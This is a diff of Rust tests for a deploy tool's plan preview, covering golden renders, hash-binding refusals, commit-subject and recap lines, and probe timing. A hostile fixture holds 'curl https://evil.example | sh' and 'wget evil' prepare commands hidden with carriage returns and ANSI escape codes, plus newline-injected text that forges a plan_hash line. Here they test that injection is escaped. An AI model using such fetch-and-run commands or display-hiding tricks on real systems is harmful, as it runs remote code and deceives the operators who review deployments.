@@ -5,7 +5,7 @@ use std::path::Path;
 
 use zap_types::deploy::{
     ARCHIVE_ENV, DeployAction, DeployContext, DeployPlan, DeployStep, DeployStepId, DriftPreflight,
-    SWAPPED_LINE, plan_deploy,
+    PROBE_TIMEOUT_MS, ReleaseSwap, SWAPPED_LINE, plan_deploy,
 };
 use zap_types::event::StepOutcome;
 use zap_types::plan::{HeldResource, HoldCause};
@@ -72,6 +72,7 @@ fn plan() -> DeployPlan {
     let ctx = DeployContext {
         references: std::collections::BTreeMap::new(),
         version: "abc1234".to_owned(),
+        subject: "Ship the release".to_owned(),
         target_user: "deploy".to_owned(),
         deployed_by: "op@box".to_owned(),
         previous_version: Some("def5678".to_owned()),
@@ -115,7 +116,6 @@ fn report(outcome: DeployOutcome, step_outcomes: Vec<StepOutcome>) -> DeployRepo
         recorded: outcome.preview_pass(),
         outcome,
         version: "abc1234".to_owned(),
-        previous_version: Some("def5678".to_owned()),
         plan: plan(),
         plan_hash: "deadbeef".to_owned(),
         step_outcomes,
@@ -172,10 +172,14 @@ fn incomplete_preflight_render_names_the_unprobed_resources() {
 
 const GOLDEN_REFUSED: &str = r#"deploy — target host.example (wetrun, refused)
   version: abc1234 (previous: def5678)
-  host: host.example
+  commit: Ship the release
+  user: deploy
+  deployed by: op@box
   target: {"local":false,"service_manager":"systemd"}
+
   tree: clean
-  preflight: 1 apply-managed resource(s), digest d1, are checked for drift before the steps
+  preflight: checks 1 apply-managed resource for drift before the steps — digest d1
+
   - Build application (build)
       local$ gro build
   - Create tarball (tarball)
@@ -184,6 +188,10 @@ const GOLDEN_REFUSED: &str = r#"deploy — target host.example (wetrun, refused)
   - Upload tarball (upload)
       the archive → target:/root/app/.zap-deploy-deploy-abc1234.tar.gz (as the connecting user, mode 600, checked against its SHA-512)
   - Extract and swap release (extract_swap)
+      app: /root/app
+      replaces: def5678 — `current` must still name it
+      links: shared/.env.production
+      keeps: 5 releases, counting this one and def5678
       target script (its stdin: the archive's SHA-512):
         set -e
         zap_archive='/root/app/.zap-deploy-deploy-abc1234.tar.gz'
@@ -303,22 +311,39 @@ const GOLDEN_REFUSED: &str = r#"deploy — target host.example (wetrun, refused)
   REFUSED — nothing ran: this plan was not reviewed.
     --expect-plan stale is not this plan's hash.
   review the plan above, then re-run with --expect-plan deadbeef, or without --expect-plan (it binds to this preview)
+
+  in short:
+    commit: Ship the release
+    version: abc1234 (previous: def5678)
+    host: host.example
+    user: deploy
+    tree: clean
+    preflight: checks 1 apply-managed resource for drift before the steps
 plan_hash: deadbeef
 "#;
 const GOLDEN_DRY_RUN: &str = r#"deploy — target <shown DEPLOY_HOST> (dry-run)
-  version: abc1234-dirty-0123abcd (previous: none)
+  version: abc1234-dirty-0123abcd (first release)
+  commit (under uncommitted changes): Ship the release
   host: app.example.com
+  user: deploy
+  deployed by: op@box
   target: {"local":false,"host":<declared DEPLOY_HOST>,"user":"deploy","port":2222}
   references:
     DEPLOY_DOMAIN = app.example.com
+
   tree: uncommitted changes or untracked files — the artifacts ship as the tree has them
   preflight: skipped (--skip-preflight)
+
   - Create tarball (tarball)
       local$ tar -czf "$ZAP_DEPLOY_ARCHIVE" -- 'build/' 'package.json'
       writes $ZAP_DEPLOY_ARCHIVE: a file in a private directory of this run, removed when it ends
   - Upload tarball (upload)
       the archive → target:/srv/app/.zap-deploy-deploy-abc1234-dirty-0123abcd.tar.gz (as the connecting user, mode 600, checked against its SHA-512)
   - Extract and swap release (extract_swap)
+      app: /srv/app
+      replaces: none — nothing may be at `current` yet
+      prepare: npm ci --omit=dev
+      keeps: 5 releases, counting this one
       target script (its stdin: the archive's SHA-512):
         set -e
         zap_archive='/srv/app/.zap-deploy-deploy-abc1234-dirty-0123abcd.tar.gz'
@@ -430,26 +455,44 @@ const GOLDEN_DRY_RUN: &str = r#"deploy — target <shown DEPLOY_HOST> (dry-run)
         zap_e=$(zap_prune '/srv/app/releases' '/srv/app/current' 5 'abc1234-dirty-0123abcd' '' 2>&1) || zap_after 'the old releases were not pruned' "$zap_e"
         printf 'Deployed version %s\n' 'abc1234-dirty-0123abcd'
   - Health check (health)
-      GET https://<shown DEPLOY_DOMAIN>/health — healthy on 2xx; up to 15 attempt(s), 2000 ms apart
-      polls https://app.example.com/health
+      GET https://app.example.com/health — healthy on 2xx; up to 15 attempts, 2s apart, 5s each (1m 43s at most)
+      declared as https://<shown DEPLOY_DOMAIN>/health
   - Readiness check (readiness)
-      GET https://<shown DEPLOY_DOMAIN>/ready — ready on 2xx, unserved on 404; up to 15 attempt(s), 2000 ms apart
-      polls https://app.example.com/ready
+      GET https://app.example.com/ready — ready on 2xx, unserved on 404; up to 15 attempts, 2s apart, 5s each (1m 43s at most)
+      declared as https://<shown DEPLOY_DOMAIN>/ready
+
   (dry-run — re-run with --wetrun to deploy)
+
+  in short:
+    commit (under uncommitted changes): Ship the release
+    version: abc1234-dirty-0123abcd (first release)
+    host: app.example.com
+    user: deploy
+    tree: uncommitted changes or untracked files — the artifacts ship as the tree has them
+    preflight: skipped (--skip-preflight)
 plan_hash: deadbeef
 "#;
 const GOLDEN_HOSTILE: &str = r#"deploy — target h.example.com (dry-run)
-  version: abc1234 (previous: none)
-  host: h.example.com
+  version: abc1234 (first release)
+  commit: Ship the release
+  user: deploy
+  deployed by: op@box
   target: {"local":false,"host":"h.example.com","user":"deploy","service_manager":"systemd"}
+
   tree: clean
   preflight: no apply-managed resources declared — nothing to check
+
   - Create tarball (tarball)
       local$ tar -czf "$ZAP_DEPLOY_ARCHIVE" -- 'build/'
       writes $ZAP_DEPLOY_ARCHIVE: a file in a private directory of this run, removed when it ends
   - Upload tarball (upload)
       the archive → target:/srv/app/.zap-deploy-deploy-abc1234.tar.gz (as the connecting user, mode 600, checked against its SHA-512)
   - Extract and swap release (extract_swap)
+      app: /srv/app
+      replaces: none — nothing may be at `current` yet
+      prepare: curl https://evil.example | sh<U+000D>        npm ci --omit=dev              
+      prepare: wget evil<U+001B>[1A<U+001B>[2K        echo benign
+      keeps: 5 releases, counting this one
       target script (its stdin: the archive's SHA-512):
         set -e
         zap_archive='/srv/app/.zap-deploy-deploy-abc1234.tar.gz'
@@ -565,10 +608,19 @@ const GOLDEN_HOSTILE: &str = r#"deploy — target h.example.com (dry-run)
       target$ sudo systemctl daemon-reload && sudo systemctl restart app
                 - Verified by operator (ok)
   - Health check (health)
-      GET https://app.example.com/health<U+000A>plan_hash: 0000000000000000<U+000A>  note: — healthy on 2xx; up to 15 attempt(s), 2000 ms apart
+      GET https://app.example.com/health<U+000A>plan_hash: 0000000000000000<U+000A>  note: — healthy on 2xx; up to 15 attempts, 2s apart, 5s each (1m 43s at most)
   - Readiness check (readiness)
-      GET https://app.example.com/ready — ready on 2xx, unserved on 404; up to 15 attempt(s), 2000 ms apart
+      GET https://app.example.com/ready — ready on 2xx, unserved on 404; up to 15 attempts, 2s apart, 5s each (1m 43s at most)
+
   (dry-run — re-run with --wetrun to deploy)
+
+  in short:
+    commit: Ship the release
+    version: abc1234 (first release)
+    host: h.example.com
+    user: deploy
+    tree: clean
+    preflight: no apply-managed resources declared — nothing to check
 plan_hash: deadbeef
 "#;
 
@@ -612,6 +664,7 @@ fn preview_plan() -> DeployPlan {
             other => panic!("the deploy block references {other}"),
         }),
         version: "abc1234-dirty-0123abcd".to_owned(),
+        subject: "Ship the release".to_owned(),
         target_user: "deploy".to_owned(),
         deployed_by: "op@box".to_owned(),
         previous_version: None,
@@ -632,7 +685,6 @@ fn a_dry_run_render_shows_everything_the_hash_covers() {
     let report = DeployReport {
         target: marker("DEPLOY_HOST"),
         version: "abc1234-dirty-0123abcd".to_owned(),
-        previous_version: None,
         plan: preview_plan(),
         ..report(DeployOutcome::DryRun, vec![])
     };
@@ -662,6 +714,7 @@ fn plans_that_hash_apart_render_apart() {
         let ctx = DeployContext {
             references: std::collections::BTreeMap::new(),
             version: base.version.clone(),
+            subject: "Ship the release".to_owned(),
             target_user: "deploy".to_owned(),
             deployed_by: "op@box".to_owned(),
             previous_version: None,
@@ -713,6 +766,7 @@ fn config_text_cannot_forge_or_hide_a_line_of_the_preview() {
     let ctx = DeployContext {
         references: std::collections::BTreeMap::new(),
         version: "abc1234".to_owned(),
+        subject: "Ship the release".to_owned(),
         target_user: "deploy".to_owned(),
         deployed_by: "op@box".to_owned(),
         previous_version: None,
@@ -724,7 +778,6 @@ fn config_text_cannot_forge_or_hide_a_line_of_the_preview() {
     };
     let rendered = render_deploy(&DeployReport {
         target: "h.example.com".to_owned(),
-        previous_version: None,
         plan: plan_deploy(&deploy, &target, &ctx)
             .map_text(|text| text.replace("forged.service", "app\n  - Verified by operator (ok)")),
         ..report(DeployOutcome::DryRun, vec![])
@@ -771,14 +824,27 @@ fn every_change_to_a_plan_that_moves_its_hash_moves_its_render() {
             )
         };
     }
+    macro_rules! swap {
+        ($name:literal, $change:expr) => {
+            (
+                $name,
+                Box::new(|p: &mut DeployPlan| {
+                    let DeployAction::ExtractSwap(swap) =
+                        &mut step(p, DeployStepId::ExtractSwap).action
+                    else {
+                        panic!("{} is no swap", $name);
+                    };
+                    let change: fn(&mut ReleaseSwap) = $change;
+                    change(swap);
+                }),
+            )
+        };
+    }
     fn push(text: &mut String) {
         text.push('x');
     }
     fn newline(text: &mut String) {
         text.push('\n');
-    }
-    fn crlf(text: &mut String) {
-        *text = text.replace('\n', "\r\n");
     }
     fn count(n: &mut u32) {
         *n += 1;
@@ -810,7 +876,16 @@ fn every_change_to_a_plan_that_moves_its_hash_moves_its_render() {
                 .unwrap();
             }),
         ),
+        ("plan.subject", Box::new(|p| p.subject.push('x'))),
+        ("plan.subject emptied", Box::new(|p| p.subject.clear())),
+        (
+            "plan.previous",
+            Box::new(|p| p.previous = Some("def5678".to_owned())),
+        ),
         ("plan.host", Box::new(|p| p.host.push('x'))),
+        ("plan.user", Box::new(|p| p.user = Some("other".to_owned()))),
+        ("plan.user (none)", Box::new(|p| p.user = None)),
+        ("plan.deployed_by", Box::new(|p| p.deployed_by.push('x'))),
         ("plan.dirty", Box::new(|p| p.dirty = !p.dirty)),
         (
             "plan.preflight (checks)",
@@ -852,29 +927,24 @@ fn every_change_to_a_plan_that_moves_its_hash_moves_its_render() {
         ),
         field!("tarball.command", Tarball, Tarball { command }, push),
         field!("upload.remote", Upload, Upload { remote }, push),
-        field!(
-            "extract_swap.script",
-            ExtractSwap,
-            ExtractSwap { script },
-            push
-        ),
-        field!(
-            "extract_swap.script + a trailing newline",
-            ExtractSwap,
-            ExtractSwap { script },
-            newline
-        ),
-        field!(
-            "extract_swap.script as CRLF",
-            ExtractSwap,
-            ExtractSwap { script },
-            crlf
-        ),
+        swap!("extract_swap.app", |s| s.app.push('x')),
+        swap!("extract_swap.keep", |s| s.keep += 1),
+        swap!("extract_swap.shared", |s| s.shared.push("x".to_owned())),
+        swap!("extract_swap.prepare", |s| s.prepare[0].push('x')),
+        swap!("extract_swap.prepare + a trailing newline", |s| s.prepare
+            [0]
+        .push('\n')),
+        swap!("extract_swap.prepare as CRLF", |s| s.prepare[0] =
+            "npm ci\r\n".to_owned()),
+        swap!("extract_swap.prepare (another)", |s| s
+            .prepare
+            .push("x".to_owned())),
         field!("restart.command", Restart, Restart { command }, push),
         field!("health.url", Health, Health { url }, push),
         field!("health.url_label", Health, Health { url_label }, push),
         field!("health.attempts", Health, Health { attempts }, count),
         field!("health.interval_ms", Health, Health { interval_ms }, millis),
+        field!("health.timeout_ms", Health, Health { timeout_ms }, millis),
         field!("readiness.url", Readiness, Readiness { url }, push),
         field!(
             "readiness.url_label",
@@ -894,6 +964,12 @@ fn every_change_to_a_plan_that_moves_its_hash_moves_its_render() {
             Readiness { interval_ms },
             millis
         ),
+        field!(
+            "readiness.timeout_ms",
+            Readiness,
+            Readiness { timeout_ms },
+            millis
+        ),
         (
             "a health action become a readiness action",
             Box::new(|p| {
@@ -903,6 +979,7 @@ fn every_change_to_a_plan_that_moves_its_hash_moves_its_render() {
                     url_label,
                     attempts,
                     interval_ms,
+                    timeout_ms,
                 } = s.action.clone()
                 {
                     s.action = DeployAction::Readiness {
@@ -910,6 +987,7 @@ fn every_change_to_a_plan_that_moves_its_hash_moves_its_render() {
                         url_label,
                         attempts,
                         interval_ms,
+                        timeout_ms,
                     };
                 }
             }),
@@ -1110,6 +1188,7 @@ async fn a_step_that_declines_to_run_is_skipped_not_completed() {
                 url,
                 attempts: 1,
                 interval_ms: 0,
+                timeout_ms: PROBE_TIMEOUT_MS,
             },
         }],
         ..plan()
@@ -1121,9 +1200,9 @@ async fn a_step_that_declines_to_run_is_skipped_not_completed() {
     let outcomes = execute_deploy_plan(
         &local,
         &target,
-        super::AppLive {
+        super::AppWalk {
             app: "/root/app",
-            previous: None,
+            swap_script: &DeployPlan::swap_script,
         },
         &plan,
         ReleaseArchive::under(scratch.path()),
@@ -1168,15 +1247,14 @@ async fn the_script_marked_warnings_reach_the_run() {
         let plan = archive_plan(
             &format!("printf x > \"${ARCHIVE_ENV}\""),
             &remote.to_string_lossy(),
-            &script,
         );
         let mut warnings = Vec::new();
         let outcomes = execute_deploy_plan(
             &Connection::Local,
             &Connection::Local,
-            super::AppLive {
+            super::AppWalk {
                 app: "/root/app",
-                previous: None,
+                swap_script: &standing_in(&script),
             },
             &plan,
             ReleaseArchive::under(&scratch),
@@ -1214,8 +1292,8 @@ async fn walk_swap(
     let mut plan = archive_plan(
         &format!("printf x > \"${ARCHIVE_ENV}\""),
         &dir.join("uploaded.tar.gz").to_string_lossy(),
-        &format!("cat > /dev/null; {script_tail}"),
     );
+    let script = format!("cat > /dev/null; {script_tail}");
     plan.steps.push(DeployStep {
         id: DeployStepId::Restart,
         name: "Restart".to_owned(),
@@ -1230,9 +1308,9 @@ async fn walk_swap(
     let outcomes = execute_deploy_plan(
         &Connection::Local,
         &Connection::Local,
-        super::AppLive {
+        super::AppWalk {
             app: &app.to_string_lossy(),
-            previous: None,
+            swap_script: &standing_in(&script),
         },
         &plan,
         ReleaseArchive::under(&scratch),
@@ -1517,8 +1595,9 @@ async fn a_failed_script_is_reported_by_its_reason() {
 }
 
 /// The three archive steps of a plan: a `Tarball` running `tarball`, an `Upload` to
-/// `remote`, and an `ExtractSwap` running `script`.
-fn archive_plan(tarball: &str, remote: &str, script: &str) -> DeployPlan {
+/// `remote`, and the default plan's `ExtractSwap`, whose script a walk test stands in
+/// for ([`standing_in`]).
+fn archive_plan(tarball: &str, remote: &str) -> DeployPlan {
     let step = |id, action| DeployStep {
         id,
         name: format!("{id}"),
@@ -1538,15 +1617,16 @@ fn archive_plan(tarball: &str, remote: &str, script: &str) -> DeployPlan {
                     remote: remote.to_owned(),
                 },
             ),
-            step(
-                DeployStepId::ExtractSwap,
-                DeployAction::ExtractSwap {
-                    script: script.to_owned(),
-                },
-            ),
+            step(DeployStepId::ExtractSwap, plan().steps[3].action.clone()),
         ],
         ..plan()
     }
+}
+
+/// An extract-and-swap script that is `script`, whatever the plan: a walk test's
+/// stand-in for [`DeployPlan::swap_script`].
+fn standing_in(script: &str) -> impl Fn(&DeployPlan, &ReleaseSwap) -> String + '_ {
+    move |_, _| script.to_owned()
 }
 
 /// The names in `dir`.
@@ -1583,14 +1663,14 @@ async fn the_archive_is_made_privately_uploaded_whole_and_named_to_the_script_by
         quoted("digest"),
         quoted("rest"),
     );
-    let plan = archive_plan(&tarball, &at("uploaded.tar.gz"), &script);
+    let plan = archive_plan(&tarball, &at("uploaded.tar.gz"));
     let mut warnings = Vec::new();
     let outcomes = execute_deploy_plan(
         &Connection::Local,
         &Connection::Local,
-        super::AppLive {
+        super::AppWalk {
             app: "/root/app",
-            previous: None,
+            swap_script: &standing_in(&script),
         },
         &plan,
         ReleaseArchive::under(&scratch),
@@ -1644,7 +1724,7 @@ async fn a_failed_archive_step_leaves_no_archive_behind() {
     let dir = tempfile::tempdir().unwrap();
     let tarball = format!("printf payload > \"${ARCHIVE_ENV}\"");
     let remote = "/srv/app/.zap-deploy-deploy-abc1234.tar.gz";
-    let plan = archive_plan(&tarball, remote, "the script");
+    let plan = archive_plan(&tarball, remote);
     let failed = |stderr: &str| CommandOutput {
         success: false,
         code: 1,
@@ -1660,9 +1740,9 @@ async fn a_failed_archive_step_leaves_no_archive_behind() {
             let outcomes = execute_deploy_plan(
                 &Connection::Local,
                 &target,
-                super::AppLive {
+                super::AppWalk {
                     app: "/root/app",
-                    previous: None,
+                    swap_script: &standing_in("the script"),
                 },
                 &plan,
                 ReleaseArchive::under(&scratch),
@@ -1764,9 +1844,9 @@ async fn a_failed_archive_step_leaves_no_archive_behind() {
     let outcomes = execute_deploy_plan(
         &Connection::Local,
         &target,
-        super::AppLive {
+        super::AppWalk {
             app: "/root/app",
-            previous: None,
+            swap_script: &DeployPlan::swap_script,
         },
         &headless,
         ReleaseArchive::under(&scratch),
@@ -1906,6 +1986,21 @@ struct Rig {
 
 const HOST: &str = "app.example.com";
 
+/// The read of the subject line of the commit the rigs' checkout is at, `abc1234`.
+const SUBJECT_READ: &str =
+    "git --no-replace-objects log -1 --no-show-signature --format=%s 'abc1234' --";
+
+/// The subject is read from the commit the version names, by its hash, as one quoted
+/// word.
+#[test]
+fn the_subject_is_read_from_the_commit_the_version_names() {
+    assert_eq!(super::checkout::subject_command("abc1234"), SUBJECT_READ);
+    assert_eq!(
+        super::checkout::subject_command("a'b"),
+        "git --no-replace-objects log -1 --no-show-signature --format=%s 'a'\\''b' --"
+    );
+}
+
 /// A deploy to an unreachable target whose host and connecting user are secrets
 /// fails with the connection error, and what it prints names each by its token —
 /// the dry run's and the wetrun's alike (a wetrun of a plan on a masked host is
@@ -1919,6 +2014,7 @@ async fn a_connection_error_names_a_secret_host_and_user_by_token() {
         MockConnection::new("local")
             .with(super::checkout::DIRTY_TREE_STATUS, ok(""))
             .with("git rev-parse --short=12 HEAD", ok("abc1234\n"))
+            .with(SUBJECT_READ, ok("Ship the release\n"))
             .with("whoami", ok("op\n"))
             .with("hostname", ok("box\n")),
     );
@@ -1989,6 +2085,7 @@ impl Rig {
         let local = MockConnection::new("local")
             .with(super::checkout::DIRTY_TREE_STATUS, ok(""))
             .with("git rev-parse --short=12 HEAD", ok("abc1234\n"))
+            .with(SUBJECT_READ, ok("Ship the release\n"))
             .with("whoami", ok("op\n"))
             .with("hostname", ok("box\n"));
         let target = MockConnection::new(HOST)
@@ -2029,10 +2126,11 @@ impl Rig {
                 DeployAction::Build { command } | DeployAction::Tarball { command, .. } => {
                     self.local = self.local.with(command.clone(), ok(""));
                 }
-                DeployAction::ExtractSwap { script } => {
-                    self.target = self
-                        .target
-                        .with(script.clone(), ok(&format!("{SWAPPED_LINE}\nDeployed\n")));
+                DeployAction::ExtractSwap(swap) => {
+                    self.target = self.target.with(
+                        plan.swap_script(swap),
+                        ok(&format!("{SWAPPED_LINE}\nDeployed\n")),
+                    );
                 }
                 DeployAction::Upload { remote } => {
                     self.target = self.target.with(upload_put(remote), ok(""));
@@ -2150,12 +2248,13 @@ impl Rig {
 
     /// Everything issued beyond the reads that build the plan.
     fn issued_past_the_plan(&self) -> Vec<String> {
-        const PLAN_READS: [&str; 9] = [
+        const PLAN_READS: [&str; 10] = [
             super::checkout::DIRTY_TREE_STATUS,
             super::checkout::DIRTY_TREE_DIFF,
             super::checkout::DIRTY_TREE_UNTRACKED,
             super::checkout::DIRTY_TREE_BLOBS,
             "git rev-parse --short=12 HEAD",
+            SUBJECT_READ,
             "whoami",
             "hostname",
             "if [ -L '/srv/app/current' ]; then readlink -- '/srv/app/current'; elif [ -e '/srv/app/current' ]; then exit 4; else exit 3; fi",
@@ -2273,11 +2372,15 @@ async fn a_wetrun_expecting_another_plan_refuses_before_the_preflight_and_every_
             "{rendered}"
         );
         assert!(
-            rendered.ends_with(&format!(
+            rendered.contains(&format!(
                 "re-run with --expect-plan {hash}, or without --expect-plan (it binds to \
-                 this preview)\nplan_hash: {hash}\n",
+                 this preview)\n",
                 hash = report.plan_hash
             )),
+            "{rendered}"
+        );
+        assert!(
+            rendered.ends_with(&format!("\nplan_hash: {}\n", report.plan_hash)),
             "{rendered}"
         );
     }
@@ -2332,14 +2435,31 @@ const GOLDEN_NO_PREVIEW_TAIL: &str = "
   REFUSED — nothing ran: this plan was not reviewed.
     no deploy plan has been previewed for this host.
   review the plan above, then re-run `zap deploy --wetrun` with the same flags (it binds to this preview) or pass --expect-plan deadbeef
-plan_hash: deadbeef
 ";
 const GOLDEN_CHANGED_TAIL: &str = "
   REFUSED — nothing ran: this plan was not reviewed.
     the last preview (zap deploy (dry run) at 2026-09-28T12:00:00Z) planned 0123abcd; the config, `zap.lock`, the checkout, the flags, the target, or the environment its host, user, or health domain resolve from changed since.
   review the plan above, then re-run `zap deploy --wetrun` with the same flags (it binds to this preview) or pass --expect-plan deadbeef
+";
+/// The foot of a preview of the default plan, and of a rig's, on `<host>`: its recap,
+/// then its hash.
+const GOLDEN_RECAP: &str = "
+  in short:
+    commit: Ship the release
+    version: abc1234 (previous: def5678)
+    host: <host>
+    user: deploy
+    tree: clean
+    preflight: checks 1 apply-managed resource for drift before the steps
 plan_hash: deadbeef
 ";
+
+/// A refusal's block (`block`, a `GOLDEN_*_TAIL`), then the recap and the hash of a plan
+/// on `host` whose hash is `hash`: how a refused preview of the default plan or a rig's
+/// ends.
+fn refused_foot(block: &str, host: &str, hash: &str) -> String {
+    format!("{block}{}", GOLDEN_RECAP.replace("<host>", host)).replace("deadbeef", hash)
+}
 
 /// The two refusals that read the recorded preview, word for word under the plan —
 /// and the time and hash read back from disk are escaped like any other text.
@@ -2358,7 +2478,14 @@ fn a_refusal_for_want_of_a_preview_says_why_and_how_to_bind() {
         DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None }),
         vec![],
     ));
-    assert!(none.ends_with(GOLDEN_NO_PREVIEW_TAIL), "{none}");
+    assert!(
+        none.ends_with(&refused_foot(
+            GOLDEN_NO_PREVIEW_TAIL,
+            "host.example",
+            "deadbeef"
+        )),
+        "{none}"
+    );
     assert!(none.starts_with("deploy — target host.example (wetrun, refused)\n"));
     assert!(none.contains("  - Create tarball (tarball)"), "{none}");
 
@@ -2370,7 +2497,14 @@ fn a_refusal_for_want_of_a_preview_says_why_and_how_to_bind() {
         ),
         vec![],
     ));
-    assert!(moved.ends_with(GOLDEN_CHANGED_TAIL), "{moved}");
+    assert!(
+        moved.ends_with(&refused_foot(
+            GOLDEN_CHANGED_TAIL,
+            "host.example",
+            "deadbeef"
+        )),
+        "{moved}"
+    );
 
     let hostile = render_deploy(&report(
         changed(
@@ -2491,7 +2625,7 @@ async fn a_cold_wetrun_refuses_records_its_plan_and_the_next_deploys() {
     let rendered = render_deploy(&cold);
     assert!(rendered.contains("(wetrun, refused)"), "{rendered}");
     assert!(
-        rendered.ends_with(&GOLDEN_NO_PREVIEW_TAIL.replace("deadbeef", &cold.plan_hash)),
+        rendered.ends_with(&refused_foot(GOLDEN_NO_PREVIEW_TAIL, HOST, &cold.plan_hash)),
         "{rendered}"
     );
     let preview = rig.preview().expect("the refusal records what it rendered");
@@ -2576,15 +2710,23 @@ async fn a_change_after_the_preview_refuses_the_wetrun() {
         assert_eq!(report.exit_code(), 2);
         assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new(), "{what}");
         assert!(rig.target.issued_queries().is_empty(), "{what}");
-        // The refusal block, then the foot (a dirty tree's warning sits between).
+        // The refusal block, then the foot (a dirty tree's warning and the plan's recap
+        // sit between).
         let rendered = render_deploy(&report);
-        let tail = GOLDEN_CHANGED_TAIL
+        let block = GOLDEN_CHANGED_TAIL
             .replace("0123abcd", &dry.plan_hash)
             .replace("2026-09-28T12:00:00Z", &reviewed.ran_at)
             .replace("deadbeef", &report.plan_hash);
-        let (block, foot) = tail.split_at(tail.find("plan_hash: ").unwrap());
-        assert!(rendered.contains(block), "{what}: {rendered}");
-        assert!(rendered.ends_with(foot), "{what}: {rendered}");
+        assert!(rendered.contains(&block), "{what}: {rendered}");
+        let recap = &rendered[rendered.find("\n  in short:\n    commit").unwrap()..];
+        assert!(
+            recap.contains(&format!("\n    version: {} (", report.plan.version)),
+            "{what}: {rendered}"
+        );
+        assert!(
+            rendered.ends_with(&format!("\nplan_hash: {}\n", report.plan_hash)),
+            "{what}: {rendered}"
+        );
         // The refusal rendered the moved plan, so that is the preview now.
         let preview = rig.preview().unwrap();
         assert_eq!(preview.plan_hash, report.plan_hash, "{what}");
@@ -3427,8 +3569,8 @@ async fn a_resource_removed_or_edited_after_the_review_is_a_different_plan() {
     assert_eq!(count, 2);
     assert!(
         render_deploy(&reviewed).contains(&format!(
-            "  preflight: 2 apply-managed resource(s), digest {digest}, are checked for \
-             drift before the steps\n"
+            "  preflight: checks 2 apply-managed resources for drift before the steps — \
+             digest {digest}\n"
         )),
         "{}",
         render_deploy(&reviewed)
@@ -3849,6 +3991,285 @@ async fn each_masked_reference_is_told_its_own_way_out() {
     );
 }
 
+/// The render a wetrun asks under ends with what the operator confirms against: the
+/// banner and why it is asked, then the recap of what tells this deploy from the next —
+/// the version and the release it replaces, the host and the connecting user, the tree,
+/// the preflight — then the hash the question asks for the start of.
+#[test]
+fn the_asking_render_ends_with_the_recap_above_the_hash() {
+    use crate::commands::Confirmation;
+
+    let rendered = render_deploy(&DeployReport {
+        confirmation: Some(Confirmation::Asking),
+        ..report(
+            DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None }),
+            vec![],
+        )
+    });
+    assert!(
+        rendered.starts_with("deploy — target host.example (wetrun, awaiting confirmation)\n"),
+        "{rendered}"
+    );
+    assert!(
+        rendered.ends_with(
+            "      target$ sudo systemctl daemon-reload && sudo systemctl restart app
+
+  UNREVIEWED — nothing has run: this plan runs only once it is confirmed below.
+    no deploy plan has been previewed for this host.
+
+  in short:
+    commit: Ship the release
+    version: abc1234 (previous: def5678)
+    host: host.example
+    user: deploy
+    tree: clean
+    preflight: checks 1 apply-managed resource for drift before the steps
+plan_hash: deadbeef
+"
+        ),
+        "{rendered}"
+    );
+}
+
+/// The recap closes every preview — a dry run, a refusal, a declined question, and the
+/// two that have no hash — and no render of a run that went past its review, or stopped
+/// short of a plan.
+#[test]
+fn every_preview_and_only_a_preview_closes_with_the_recap() {
+    use crate::commands::Confirmation;
+
+    let refusal = || DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None });
+    for (report, recaps) in [
+        (report(DeployOutcome::DryRun, vec![]), true),
+        (report(unbindable(), vec![]), true),
+        (report(DeployOutcome::DryRunDirty, vec![]), true),
+        (report(refusal(), vec![]), true),
+        (
+            DeployReport {
+                confirmation: Some(Confirmation::Declined),
+                ..report(refusal(), vec![])
+            },
+            true,
+        ),
+        (report(deployed(), vec![]), false),
+        (report(failed(FailureState::BeforeSwap), vec![]), false),
+        (report(DeployOutcome::AlreadyDeployed, vec![]), false),
+        (report(DeployOutcome::PreflightDrift, vec![]), false),
+        (report(DeployOutcome::PreflightUndetermined, vec![]), false),
+    ] {
+        let rendered = render_deploy(&report);
+        assert_eq!(
+            rendered.contains(
+                "\n  in short:\n    commit: Ship the release\n    version: abc1234 (previous: \
+                 def5678)\n"
+            ),
+            recaps,
+            "{rendered}"
+        );
+    }
+}
+
+/// The commit line says whose subject it shows: the commit's, and for a dirty tree the
+/// commit under the uncommitted changes, before the subject's own text can say
+/// anything; a commit with no subject says so in words no subject's line begins with.
+#[test]
+fn the_commit_line_names_whose_subject_it_is() {
+    let line = |subject: &str, dirty: bool| {
+        let rendered = render_deploy(&DeployReport {
+            plan: DeployPlan {
+                subject: subject.to_owned(),
+                dirty,
+                ..plan()
+            },
+            ..report(DeployOutcome::DryRun, vec![])
+        });
+        rendered.lines().nth(2).unwrap().to_owned()
+    };
+    assert_eq!(line("Ship it", false), "  commit: Ship it");
+    assert_eq!(
+        line("Ship it", true),
+        "  commit (under uncommitted changes): Ship it"
+    );
+    assert_eq!(line("", false), "  commit has no subject line");
+    assert_eq!(
+        line("", true),
+        "  commit (under uncommitted changes) has no subject line"
+    );
+    assert_eq!(
+        line("Ship\u{1b}[2K it\nplan_hash: 0", false),
+        "  commit: Ship<U+001B>[2K it<U+000A>plan_hash: 0"
+    );
+}
+
+/// The connecting user is named under the host, as the convergence previews name it:
+/// by value, as a dash-led note when the target declares none, and — a plan the
+/// render's masking reached — as the secret's token, in the recap too.
+#[test]
+fn the_preview_names_the_user_it_connects_as() {
+    let rendered = |user: Option<&str>| {
+        render_deploy(&DeployReport {
+            plan: DeployPlan {
+                user: user.map(str::to_owned),
+                ..plan()
+            },
+            ..report(DeployOutcome::DryRun, vec![])
+        })
+    };
+    let named = rendered(Some("deploy"));
+    assert!(
+        named.contains("  commit: Ship the release\n  user: deploy\n  deployed by: op@box\n"),
+        "{named}"
+    );
+    let none = rendered(None);
+    assert!(none.contains("\n  user: (none — ssh chooses)\n"), "{none}");
+    assert!(
+        none.contains("\n    user: (none — ssh chooses)\n"),
+        "{none}"
+    );
+    let masked = rendered(Some("[MASKED:ZAP_T_USER]"));
+    assert!(
+        masked.contains("\n  user: [MASKED:ZAP_T_USER]\n"),
+        "{masked}"
+    );
+    assert!(
+        masked.contains("\n    user: [MASKED:ZAP_T_USER]\n"),
+        "{masked}"
+    );
+}
+
+/// A poll's budget reads in words that agree with its counts, its times exact, the
+/// most it can take stated whole: every wait and every attempt run to its limit.
+#[test]
+fn a_poll_states_its_whole_budget() {
+    use super::render::format_millis;
+
+    let lines = |url: &str, attempts: u32, interval_ms: u64, timeout_ms: u64| {
+        let rendered = render_deploy(&DeployReport {
+            plan: DeployPlan {
+                steps: vec![DeployStep {
+                    id: DeployStepId::Health,
+                    name: "Health check".to_owned(),
+                    action: DeployAction::Health {
+                        url: url.to_owned(),
